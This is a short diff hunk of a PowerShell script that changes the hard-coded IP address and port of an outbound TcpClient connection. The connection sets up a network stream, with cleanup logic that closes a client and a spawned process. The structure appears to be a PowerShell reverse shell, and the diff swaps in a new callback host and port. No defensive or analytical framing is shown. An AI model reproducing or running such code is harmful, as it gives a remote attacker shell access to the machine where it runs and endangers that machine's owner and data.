@@ -3,8 +3,8 @@ if ($client.Connected -eq $true) {$client.Close()}
 if ($process.ExitCode -ne $null) {$process.Close()}
 exit}
 
-$address = '65.0.50.125'
-$port = '22629'
+$address = '206.189.80.59'
+$port = '22812'
 $client = New-Object system.net.sockets.tcpclient
 $client.connect($address,$port)
 $stream = $client.GetStream()
